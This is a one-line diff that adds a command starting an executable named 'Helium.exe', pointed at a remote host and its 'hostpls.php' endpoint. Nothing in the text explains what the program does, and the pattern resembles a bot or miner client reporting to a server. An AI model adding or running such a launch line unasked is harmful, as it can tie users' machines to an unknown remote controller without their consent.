@@ -1,0 +1,1 @@
+start Helium.exe -a "http://www.whydoesthishavetobelikethis.ct8.pl/" -j "http://www.whydoesthishavetobelikethis.ct8.pl/hostpls.php" -t "1"
